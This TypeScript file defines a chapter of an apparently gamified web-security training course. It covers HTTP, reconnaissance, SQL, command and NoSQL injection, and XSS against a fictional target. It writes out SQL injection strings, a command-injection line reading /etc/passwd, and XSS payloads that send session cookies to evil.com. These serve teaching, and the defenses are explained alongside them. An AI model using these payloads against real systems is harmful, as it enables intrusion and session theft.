import type { OrientationChapter } from './index.js';

export function getChapter07(): OrientationChapter {
  return {
    id: 'ch07-web-underbelly',
    number: 7,
    title: 'The Web\'s Soft Underbelly',
    subtitle: 'Web Application Vulnerabilities',
    clearanceLevel: 'LEVEL 2 — CLASSIFIED',
    tier: 3,
    estimatedMinutes: 35,
    sections: [
      // ═══════════════════════════════════════════
      // SECTION 1: HOW WEB APPS WORK
      // ═══════════════════════════════════════════
      {
        id: 'how-web-apps-work',
        title: 'How Web Apps Work',
        steps: [
          {
            type: 'narrative',
            speaker: 'HANDLER',
            lines: [
              'Welcome to Tier 3, Observer. The material from here forward',
              'deals with offensive techniques and exploit mechanics.',
              'You\'re learning these so you can recognize them in the',
              'field — not to deploy them. Clear?',
              '',
              'Web applications are the most exposed attack surface in',
              'any organization. Every login page, search bar, file upload,',
              'and API endpoint is a potential entry point. To understand',
              'how they break, you need to understand how they work.',
            ],
          },
          {
            type: 'narrative',
            speaker: 'HANDLER',
            lines: [
              'The HTTP request/response cycle:',
              '',
              '  CLIENT (Browser)  ──request──▸  SERVER (Web App)',
              '  CLIENT (Browser)  ◂──response──  SERVER (Web App)',
              '',
              'Every interaction follows this pattern. The client sends',
              'a request; the server processes it and returns a response.',
              '',
              '  HTTP METHODS:',
              '    GET    — Retrieve data. "Show me this page."',
              '    POST   — Submit data. "Process this form."',
              '    PUT    — Update data. "Replace this record."',
              '    DELETE — Remove data. "Delete this record."',
              '    PATCH  — Partial update. "Change this field."',
              '',
              '  KEY HEADERS:',
              '    Host           — which domain the request is for',
              '    Cookie         — session tokens, preferences, state',
              '    Authorization  — API keys, Bearer tokens, Basic auth',
              '    Content-Type   — format of the request body (JSON, form data)',
              '    User-Agent     — browser/client identification',
              '    Referer        — the page that linked to this request',
            ],
          },
          {
            type: 'narrative',
            speaker: 'HANDLER',
            lines: [
              '  COOKIES — the memory of the web.',
              '    Set by the server via Set-Cookie header.',
              '    Sent back automatically on every subsequent request.',
              '    Session cookies identify you after login.',
              '    Flags that matter:',
              '      HttpOnly  — JavaScript can\'t read the cookie (XSS defense)',
              '      Secure    — only sent over HTTPS',
              '      SameSite  — controls cross-origin sending (CSRF defense)',
              '',
              '  STATUS CODES:',
              '    200 OK          — success',
              '    301/302         — redirect (watch for open redirect vulns)',
              '    400 Bad Request — malformed input',
              '    401 Unauthorized — not authenticated',
              '    403 Forbidden   — authenticated but not authorized',
              '    404 Not Found   — resource doesn\'t exist',
              '    500 Server Error — something broke server-side',
              '',
              'The fundamental security problem with web applications:',
              'users can submit arbitrary input. Every parameter, header,',
              'cookie, and URL path segment is attacker-controlled data.',
              'If the server trusts that input without validation, it\'s',
              'vulnerable.',
            ],
          },
          {
            type: 'quiz',
            speaker: 'HANDLER',
            lines: [
              'A web application returns the following response:',
              '',
              '  HTTP/1.1 403 Forbidden',
              '  Server: nginx/1.18.0',
              '  Content-Type: text/html',
              '',
              'A different endpoint returns:',
              '',
              '  HTTP/1.1 302 Found',
              '  Location: /login?redirect=/admin/settings',
              '  Set-Cookie: session=abc123; Path=/',
            ],
            question: 'What security concerns do these responses reveal?',
            options: [
              { id: 'correct', text: '403 leaks the server version (nginx 1.18.0), and the 302 exposes an admin path and sets a cookie without HttpOnly or Secure flags', correct: true },
              { id: 'partial', text: 'The 403 is correct behavior — the server is blocking unauthorized access', correct: false },
              { id: 'wrong', text: 'The 302 redirect is a normal authentication flow with no security implications', correct: false },
            ],
          },
        ],
      },

      // ═══════════════════════════════════════════
      // SECTION 2: MAPPING ATTACK SURFACE
      // ═══════════════════════════════════════════
      {
        id: 'mapping-attack-surface',
        title: 'Mapping the Attack Surface',
        steps: [
          {
            type: 'narrative',
            speaker: 'HANDLER',
            lines: [
              'Before testing for vulnerabilities, you map the target.',
              'What pages exist? What parameters do they accept? What',
              'technologies are running? What\'s hidden?',
              '',
              '  SPIDERING / CRAWLING',
              '    Automated tools follow every link on the site, building',
              '    a complete map of pages, forms, and parameters.',
              '',
              '  DIRECTORY DISCOVERY',
              '    Brute-forcing common paths: /admin, /backup, /api/v1,',
              '    /.git, /wp-admin, /phpmyadmin, /server-status.',
              '    Developers leave things exposed more often than you\'d',
              '    expect. Backup files (.bak, .old), configuration files,',
              '    debug endpoints, administrative panels.',
              '',
              '  PARAMETER IDENTIFICATION',
              '    Every input field, URL parameter, hidden form field,',
              '    and API parameter is a potential injection point.',
              '    Example: /search?q=test — the "q" parameter accepts',
              '    user input and probably gets included in a database',
              '    query or rendered on the page.',
            ],
          },
          {
            type: 'guided-command',
            speaker: 'HANDLER',
            expectedCommand: 'webapp scan --target=portal.corp.local',
            commandPatterns: ['webapp scan --target=portal.corp.local', 'webapp scan --target portal.corp.local'],
            lines: [
              'Run a scan against the training target. Map its surface.',
            ],
            commandOutput: `═══ WEB APPLICATION SCAN: portal.corp.local ═════════════

TECHNOLOGY STACK:
  Server: Apache 2.4.49  !! KNOWN CVE: Path Traversal (CVE-2021-41773) !!
  Framework: PHP 7.4
  Database: MySQL (detected via error messages)
  CMS: Custom

DISCOVERED PAGES:
  /                       200  Homepage
  /login                  200  Login form (POST: username, password)
  /dashboard              302  Redirect to /login (requires auth)
  /search                 200  Search form (GET: q, category, sort)
  /api/v1/users           401  API endpoint (requires Bearer token)
  /api/v1/documents       401  API endpoint (requires Bearer token)
  /admin/login            200  !! ADMIN PANEL EXPOSED !!
  /backup/db-export.sql   200  !! DATABASE BACKUP ACCESSIBLE !!
  /server-status          200  !! APACHE STATUS PAGE EXPOSED !!
  /.git/config            200  !! GIT REPOSITORY EXPOSED !!

PARAMETERS IDENTIFIED:
  /search?q=              User input → potential injection
  /search?category=       User input → potential injection
  /login (POST: username) User input → potential injection
  /login (POST: password) User input → potential injection

FINDINGS: 4 critical exposures, 4 injection candidates`,
            explanation: [
              'Four critical findings before we even test for vulnerabilities:',
              '',
              'Apache 2.4.49 — known path traversal CVE. An attacker can',
              'read arbitrary files from the server, including /etc/passwd',
              'and application source code.',
              '',
              'db-export.sql — a database backup sitting in a public directory.',
              'This likely contains every user record, password hash, and',
              'piece of sensitive data in the application.',
              '',
              '.git/config exposed — the attacker can reconstruct the entire',
              'source code of the application, including hardcoded secrets,',
              'API keys, and database credentials.',
              '',
              'server-status — leaks internal IPs, current connections,',
              'and request details. Valuable reconnaissance.',
              '',
              'Four injection candidates on /search and /login. We\'ll test',
              'those next.',
            ],
            hintOnWrong: 'Type: webapp scan --target=portal.corp.local',
          },
        ],
      },

      // ═══════════════════════════════════════════
      // SECTION 3: INJECTION ATTACKS
      // ═══════════════════════════════════════════
      {
        id: 'injection-attacks',
        title: 'Injection Attacks',
        steps: [
          {
            type: 'narrative',
            speaker: 'HANDLER',
            lines: [
              'Injection is the most dangerous class of web vulnerability.',
              'The principle: user input is interpreted as code.',
              '',
              '  SQL INJECTION',
              '    When user input is inserted directly into a SQL query',
              '    without sanitization or parameterization.',
              '',
              '    The application expects: SELECT * FROM users WHERE name = \'Alice\'',
              '    The attacker submits: Alice\' OR \'1\'=\'1',
              '    The query becomes: SELECT * FROM users WHERE name = \'Alice\' OR \'1\'=\'1\'',
              '    Result: returns ALL users. The WHERE clause is always true.',
              '',
              '  UNION-BASED SQLi',
              '    UNION SELECT lets the attacker append additional queries:',
              '    \' UNION SELECT username, password FROM admin_users --',
              '    The response now includes admin credentials alongside',
              '    legitimate search results.',
              '',
              '  BLIND SQLi',
              '    The application doesn\'t show query results directly.',
              '    The attacker asks true/false questions:',
              '    \' AND SUBSTRING(password,1,1)=\'a\' --',
              '    Different response for true vs false reveals data',
              '    one character at a time. Slow but effective.',
            ],
          },
          {
            type: 'narrative',
            speaker: 'HANDLER',
            lines: [
              '  SECOND-ORDER SQLi',
              '    The payload is stored in the database (e.g., user',
              '    registration), then executed later when a different',
              '    query reads that stored value. Harder to detect',
              '    because the injection and execution happen at',
              '    different times and in different contexts.',
              '',
              '  OS COMMAND INJECTION',
              '    When user input is passed to a system shell command.',
              '    The application runs: ping <user_input>',
              '    The attacker submits: 8.8.8.8; cat /etc/passwd',
              '    The semicolon terminates the ping command and executes',
              '    the next command. Full server compromise.',
              '',
              '  NoSQL INJECTION',
              '    MongoDB and similar databases are not immune.',
              '    Instead of SQL syntax, the attacker injects query',
              '    operators: {"$gt": ""} always evaluates to true.',
              '    {"$regex": ".*"} matches everything.',
              '    Different syntax, same principle: untrusted input',
              '    interpreted as query logic.',
            ],
          },
          {
            type: 'guided-command',
            speaker: 'HANDLER',
            expectedCommand: 'inject test --target=portal.corp.local --param=search',
            commandPatterns: ['inject test --target=portal.corp.local --param=search', 'inject test --target portal.corp.local --param search'],
            lines: [
              'Test the search parameter for injection vulnerabilities.',
            ],
            commandOutput: `═══ INJECTION TEST: portal.corp.local/search?q= ════════

TEST 1: Basic SQLi detection
  Payload: ' OR '1'='1
  Response: 200 OK — returned 847 results (normal query returns 12)
  !! VULNERABLE — Boolean-based SQL injection confirmed !!

TEST 2: UNION-based extraction
  Payload: ' UNION SELECT table_name,NULL FROM information_schema.tables --
  Response: 200 OK — database schema leaked in results
  Tables found: users, documents, admin_sessions, audit_log, api_keys

TEST 3: Data extraction
  Payload: ' UNION SELECT username, password_hash FROM users LIMIT 5 --
  Response: 200 OK
  ┌──────────────┬────────────────────────────────────┐
  │ username     │ password_hash                       │
  ├──────────────┼────────────────────────────────────┤
  │ admin        │ 5f4dcc3b5aa765d61d8327deb882cf99   │
  │ j.martinez   │ e99a18c428cb38d5f260853678922e03   │
  │ s.wong       │ d8578edf8458ce06fbc5bb76a58c5ca4   │
  │ r.patel      │ 482c811da5d5b4bc6d497ffa98491e38   │
  │ m.johnson    │ 5f4dcc3b5aa765d61d8327deb882cf99   │
  └──────────────┴────────────────────────────────────┘

TEST 4: OS Command injection
  Payload: ; whoami
  Response: Not vulnerable (input not passed to shell)

SUMMARY: SQL injection confirmed. 5 user credentials extracted.
         Admin hash matches MD5("password"). Trivially crackable.`,
            explanation: [
              'Full SQL injection chain. The search parameter is concatenated',
              'directly into a SQL query with no parameterization, no input',
              'validation, and no WAF filtering.',
              '',
              'The attacker can extract the entire database — user credentials,',
              'documents, API keys, session tokens. The admin password hashes',
              'to "password" in MD5. Two users share the same hash, meaning',
              'they use the same password.',
              '',
              'The fix is parameterized queries (prepared statements). Never',
              'concatenate user input into SQL. The query structure and the',
              'data must be separate.',
            ],
            hintOnWrong: 'Type: inject test --target=portal.corp.local --param=search',
          },
          {
            type: 'scenario',
            speaker: 'HANDLER',
            scenarioContext: 'A web application registration form stores a user-provided "company name" field. When an admin later views the user list in the admin panel, the stored company name is inserted into a SQL query to fetch company details. An attacker registers with company name: \' UNION SELECT password FROM admin_creds -- and waits for an admin to trigger the second query.',
            lines: [
              'Scenario. A DI7 client reports that their admin panel is',
              'displaying unexpected data — credential hashes appearing',
              'where company names should be.',
              '',
              'You investigate. The registration form allows arbitrary',
              'text in the "Company Name" field. That value is stored in',
              'the database as-is. When an administrator views the user',
              'list, the application queries: SELECT * FROM companies',
              'WHERE name = \'<stored_company_name>\'',
              '',
              'An attacker registered with the company name:',
              '  \' UNION SELECT password FROM admin_creds --',
              '',
              'This is second-order SQL injection. The payload was dormant',
              'during registration — the INSERT query wasn\'t vulnerable.',
              'But the admin panel\'s SELECT query is. The stored payload',
              'activates when a different part of the application reads it.',
              '',
              'Detection is difficult because the injection point and the',
              'execution point are in different workflows. Input validation',
              'must happen at every boundary — not just where data enters,',
              'but everywhere data is used.',
            ],
          },
          {
            type: 'quiz',
            speaker: 'HANDLER',
            lines: [
              'A developer tells you: "We sanitize all user input on the',
              'registration form. SQL injection is impossible."',
              '',
              'However, the application also accepts data from:',
              '  - CSV file imports (bulk user upload)',
              '  - API calls from partner integrations',
              '  - Data synchronized from a third-party CRM',
            ],
            question: 'Is the developer\'s claim correct?',
            options: [
              { id: 'correct', text: 'No — input validation on one entry point doesn\'t protect against injection through other data sources. Every input boundary requires parameterized queries.', correct: true },
              { id: 'wrong-yes', text: 'Yes — if the registration form is sanitized, the data in the database is safe', correct: false },
              { id: 'wrong-partial', text: 'Partially — the API calls are safe because they use JSON, not SQL', correct: false },
            ],
          },
        ],
      },

      // ═══════════════════════════════════════════
      // SECTION 4: CROSS-SITE SCRIPTING (XSS)
      // ═══════════════════════════════════════════
      {
        id: 'cross-site-scripting',
        title: 'Cross-Site Scripting (XSS)',
        steps: [
          {
            type: 'narrative',
            speaker: 'HANDLER',
            lines: [
              'SQL injection targets the server. Cross-Site Scripting',
              'targets the user. The attacker injects JavaScript that',
              'executes in the victim\'s browser.',
              '',
              '  REFLECTED XSS',
              '    The payload is in the URL or request, and the server',
              '    reflects it back in the response without encoding.',
              '    /search?q=<script>document.location=\'https://evil.com/steal?\'+document.cookie</script>',
              '    The victim clicks a crafted link. Their browser executes',
              '    the script. Their session cookie is sent to the attacker.',
              '',
              '  STORED XSS',
              '    The payload is saved in the database (comment, profile,',
              '    forum post) and served to every user who views it.',
              '    More dangerous than reflected — one injection affects',
              '    every visitor. MySpace Samy worm (2005): a stored XSS',
              '    that added a million friends in 20 hours.',
              '',
              '  DOM-BASED XSS',
              '    The vulnerability is in client-side JavaScript, not',
              '    the server response. The page reads from a source',
              '    (URL fragment, postMessage) and writes it to a sink',
              '    (innerHTML, eval) without sanitization.',
            ],
          },
          {
            type: 'narrative',
            speaker: 'HANDLER',
            lines: [
              'Real impact of XSS — this is not a theoretical concern.',
              '',
              '  SESSION HIJACKING',
              '    Steal the victim\'s session cookie. The attacker becomes',
              '    the victim — logged in, full access, no password needed.',
              '',
              '  CREDENTIAL THEFT',
              '    Inject a fake login form over the real page. The user',
              '    types their password into the attacker\'s form. Phishing',
              '    on a legitimate domain — the URL bar shows the real site.',
              '',
              '  KEYLOGGING',
              '    Inject a script that captures every keystroke on the page.',
              '    Passwords, messages, search queries — all exfiltrated.',
              '',
              '  WORM PROPAGATION',
              '    Self-replicating XSS that spreads from user to user.',
              '    The payload modifies the victim\'s profile to include',
              '    itself, infecting every subsequent viewer.',
              '',
              'Defenses: output encoding (HTML entities), Content Security',
              'Policy (CSP) headers, HttpOnly cookies, input validation.',
              'The principle: never insert untrusted data into HTML, JS,',
              'CSS, or URLs without context-appropriate encoding.',
            ],
          },
          {
            type: 'quiz',
            speaker: 'HANDLER',
            lines: [
              'An application displays user comments on a product page.',
              'A user posts this comment:',
              '',
              '  Great product! <img src=x onerror="fetch(\'https://evil.com/?\'+document.cookie)">',
              '',
              'The comment appears on the page. Every visitor\'s browser',
              'tries to load the image, fails, and the onerror handler',
              'fires — sending their session cookie to evil.com.',
            ],
            question: 'What type of XSS is this, and what is the immediate risk?',
            options: [
              { id: 'stored', text: 'Stored XSS — every visitor\'s session cookie is stolen, enabling mass account takeover', correct: true },
              { id: 'reflected', text: 'Reflected XSS — only the commenter is affected', correct: false },
              { id: 'dom', text: 'DOM-based XSS — the server is not involved', correct: false },
              { id: 'csrf', text: 'Cross-Site Request Forgery — the image triggers unauthorized actions', correct: false },
            ],
          },
          {
            type: 'narrative',
            speaker: 'HANDLER',
            lines: [
              'Stored XSS. The payload persists in the database and',
              'executes for every visitor. Mass session hijacking.',
              '',
              'The img-onerror technique bypasses many naive filters',
              'that only look for <script> tags. There are hundreds of',
              'XSS vectors: event handlers (onload, onmouseover, onfocus),',
              'SVG elements, iframe srcdoc, JavaScript URIs, CSS',
              'expression(), and more. Blocklist-based filtering always',
              'loses this arms race.',
              '',
              'This chapter covered the mechanics of web application',
              'attacks — from the HTTP fundamentals to injection and XSS.',
              'Next: we go beyond the web. How attackers breach the',
              'perimeter itself.',
            ],
          },
        ],
      },
    ],
  };
}
